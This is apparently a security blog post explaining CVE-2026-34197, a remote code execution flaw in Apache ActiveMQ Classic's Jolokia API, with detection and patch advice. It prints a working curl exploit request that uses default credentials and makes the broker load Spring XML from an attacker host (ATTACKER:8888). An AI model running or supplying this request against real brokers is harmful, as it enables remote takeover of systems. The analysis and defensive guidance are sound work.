+++
title = "The ActiveMQ RCE That Sat in Plain Sight for 13 Years"
date = "2026-04-07"
+++

CVE-2026-34197 is a remote code execution vulnerability in Apache ActiveMQ Classic that went unnoticed for 13 years. The researcher who published the flaw used Claude to review the project source, where the model flagged an overly broad MBean permission block. The researcher then confirmed the behavior, chained it into a working exploit, and reported it.

## The configuration exception

ActiveMQ Classic runs a web management console on port 8161 powered by Jolokia, an HTTP-to-JMX bridge. In 2022, ThreatBook showed how authenticated attackers could abuse Jolokia to execute JDK MBeans like `FlightRecorder` and drop webshells (CVE-2022-41678). The resulting fix restricted Jolokia to read-only mode and blocked hazardous MBeans, but it added an exception to keep the web console working:

```xml
<allow>
  <mbean>
    <name>org.apache.activemq:*</name>
    <attribute>*</attribute>
    <operation>*</operation>
  </mbean>
</allow>
```

That wildcard made every operation on ActiveMQ's own MBeans reachable through the HTTP API. One of those exposed operations was `addNetworkConnector`.

## Constructing the exploit chain

ActiveMQ brokers can form clusters to distribute messaging load, and `addNetworkConnector(String)` registers new connections dynamically. ActiveMQ also provides a `vm://` in-process transport for embedding brokers directly in Java applications. When a `vm://` URI names a broker that does not exist, ActiveMQ initializes one automatically, taking configuration from a `brokerConfig` parameter that can point to a remote URL.

Putting those two features together creates a clean exploit path:

```bash
curl -s -X POST http://TARGET:8161/api/jolokia/ \
  -H "Content-Type: application/json" \
  -H "Origin: http://TARGET:8161" \
  -u admin:admin \
  -d '{
    "type": "exec",
    "mbean": "org.apache.activemq:type=Broker,brokerName=localhost",
    "operation": "addNetworkConnector",
    "arguments": ["static:(vm://rce?brokerConfig=xbean:http://ATTACKER:8888/payload.xml)"]
  }'
```

When the `vm://` transport sees that the target broker is missing, it calls `BrokerFactory.createBroker()` using the attacker's URL. The `xbean:` prefix instructs ActiveMQ to parse the response as Spring XML. Spring's `ResourceXmlApplicationContext` then instantiates the beans defined in that remote file, such as a `MethodInvokingFactoryBean` configured to run `Runtime.getRuntime().exec()`. This uses the same execution sink seen in CVE-2023-46604.

## Exposure and impact

The exploit requires authentication, but many ActiveMQ deployments still run with default `admin:admin` credentials. On ActiveMQ versions 6.0.0 through 6.1.1, the situation was worse: CVE-2024-32114 omitted `/api/*` from web console security constraints, exposing Jolokia without authentication. On those releases, CVE-2026-34197 can be triggered unauthenticated over the network. 

The vendor addressed the issue in releases 5.19.6 and 6.2.5 by preventing `addNetworkConnector` from using `vm://` transports.

## Log analysis and detection

Horizon3's analysis identified a distinct log signature produced when the broker attempts to initialize the connector:

```text
INFO | Establishing network connection from vm://localhost to vm://rce?create=true&brokerConfig=xbean:http://X.X.X.X:8888/payload.xml
WARN | Could not connect to remote URI: ... The configuration has no BrokerService instance
```

The warning line appears after the remote XML payload executes, but ActiveMQ retries the connection multiple times, giving defenders a visible signal. Detection rules should also monitor POST requests to `/api/jolokia/` calling `addNetworkConnector`, unexpected outbound HTTP traffic originating from the ActiveMQ broker process, and suspicious child processes spawned by Java.

## Research implications

The discovery method is notable because the model was not fuzzing inputs or guessing common CVE templates. It analyzed the XML allowlist, identified that wildcard operations on `org.apache.activemq:*` bypassed the earlier hardening, and asked how `addNetworkConnector` could be reached. That someone was able to uncover a 13-year-old flaw in a mature open-source broker in a short prompt session highlights both the utility of LLMs for source audits and how easily broad permission wildcards slip past human review.
